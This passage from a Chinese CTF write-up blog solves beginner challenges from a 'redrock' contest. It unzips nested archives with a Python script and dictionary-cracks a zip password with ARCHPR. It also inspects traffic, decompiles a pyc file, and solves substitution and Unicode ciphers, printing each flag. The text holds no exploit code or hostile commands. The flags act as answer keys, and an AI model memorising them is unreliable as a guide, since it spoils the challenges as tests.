class="built_in">range</span>(<span class="number">114514</span>):</span><br><span class="line">            ss = i[:i.find(<span class="string">&quot;.&quot;</span>)]</span><br><span class="line">            <span class="built_in">print</span>(i)</span><br><span class="line">            zpf = zipfile.ZipFile(<span class="built_in">dir</span> + ss + <span class="string">&quot;.zip&quot;</span>)</span><br><span class="line">            <span class="built_in">list</span> = zpf.namelist()  <span class="comment"># 得到压缩包里所有文件</span></span><br><span class="line">            <span class="keyword">for</span> f <span class="keyword">in</span> <span class="built_in">list</span>:</span><br><span class="line">                zpf.extract(f, <span class="built_in">dir</span>, ss.encode(<span class="string">&#x27;utf-8&#x27;</span>))  <span class="comment"># 循环解压文件到指定目录</span></span><br><span class="line">            <span class="built_in">print</span>(ss + <span class="string">&quot;done&quot;</span> + <span class="built_in">str</span>(f))</span><br><span class="line">            i = <span class="built_in">str</span>(f)</span><br><span class="line"></span><br><span class="line">jieya()</span><br></pre></td></tr></table></figure>

<p>这样解压114514层之后，得到了最后一层yyz</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211202011170.png" alt="0"></p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211202011553.png" alt="1"></p>
<p>但是这个是加密的，而不知道密码，那就猜测是否为伪加密</p>
<p>参考：<a href="http://www.mchz.com.cn/cn/service/safety-lab/info_26.aspx?itemid=5175&ezeip=es515pfuwaihdff3mzwbdg==">CTF之压缩包处理 (mchz.com.cn)</a></p>
<p>显然这个是真加密（试过都改00，没啥用）</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211202012915.png" alt="2"></p>
<p>那就直接爆破密码，用hash爆破一下</p>
<p>参考：<a href="https://blog.csdn.net/m0_60319766/article/details/122982767">ctf赛题MISC二维码_QJ_zjj的博客-CSDN博客</a></p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211202013306.png" alt="3"></p>
<p>解压出来是个base64解密之后的内容，解码</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211202014941.png" alt="4"></p>
<p>其实用ARCHPR更快，只不过自带的字典纯纯垃圾，换个字典就几秒钟的事</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211202014518.png" alt="5"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">redrock&#123;arey0u0k?&#125;</span><br></pre></td></tr></table></figure>

<h3 id="流量审计"><a href="#流量审计" class="headerlink" title="流量审计"></a>流量审计</h3><p>看到flag点进去，看一下内容得到flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211202016521.png" alt="1"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">redrock&#123;yyz_is_god&#125;</span><br></pre></td></tr></table></figure>

<h2 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h2><h3 id="just-re-it"><a href="#just-re-it" class="headerlink" title="just_re_it"></a>just_re_it</h3><p>把exe文件丢进010 Editor看一下，只发现了个fake（？）flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211202018686.png" alt="0"></p>
<p>把这个输进文件再看看</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211202018953.png" alt="1"></p>
<p>好吧，好像这个确实是real flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">redrock&#123;This_is_fake_flag&#125;</span><br></pre></td></tr></table></figure>

<h3 id="水水爱听歌"><a href="#水水爱听歌" class="headerlink" title="水水爱听歌"></a>水水爱听歌</h3><p>得到pyc文件，在<a href="https://tool.lu/pyc/">python反编译 - 在线工具 (tool.lu)</a>反编译一下</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211202020243.png" alt="0"></p>
<p>看到zzz使用了base64编码，那就解码出来得到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">She_bid_me_to_take_love_easy_as_the_leaves_grow_on_the_tree</span><br></pre></td></tr></table></figure>

<p>再看一下代码，发现check函数时判断输入的flag变量和zzz是否相同（？），那就直接输入zzz（base64解码之后的），得到flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202211212042172.png" alt="1"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">redrock&#123;044d7a01a972dc5882831e89676220c2dc3a3c142e16379a76a45680137a6b55&#125;</span><br></pre></td></tr></table></figure>

<h3 id="赛博丁真"><a href="#赛博丁真" class="headerlink" title="赛博丁真"></a>赛博丁真</h3><p>把exe文件丢进010看一下，得到flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211202024616.png" alt="0"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">redrock&#123;ggg_ding_zhen&#125;</span><br></pre></td></tr></table></figure>

<h2 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h2><h3 id="可惜我年轻无知"><a href="#可惜我年轻无知" class="headerlink" title="可惜我年轻无知"></a>可惜我年轻无知</h3><p>题目告诉我</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yveypbl&#123;kfu_h_kvhsq_mpfsq_dse_appjhgx_rhux_xvy_rpfje_spu_dqyvv&#125;</span><br></pre></td></tr></table></figure>

<p>显然，yveypbl&#x3D;》redrock，这是一一对应的，那就是考虑映射，但显然手推不可能，就用词频分析</p>
<p>网站：<a href="http://quipqiup.com/">quipqiup - cryptoquip and cryptogram solver</a></p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211202027378.png" alt="0"></p>
<p>得到第一个就是，把空格换成_就得到flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">redrock&#123;but_i_being_young_and_foolish_with_her_would_not_agree&#125;</span><br></pre></td></tr></table></figure>

<h3 id="来自红岩的密文1"><a href="#来自红岩的密文1" class="headerlink" title="来自红岩的密文1"></a>来自红岩的密文1</h3><p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211202031602.png" alt="0"></p>
<p>一看就觉得是Unicode编码，解码得到flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211202032449.png" alt="1"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">redrock&#123;Welc0me_T0_The_CTF_0f_redR0ck!!!&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>题解</tag>
        <tag>web</tag>
        <tag>misc</tag>
        <tag>reverse</tag>
        <tag>crypto</tag>
      </tags>
  </entry>
</search>
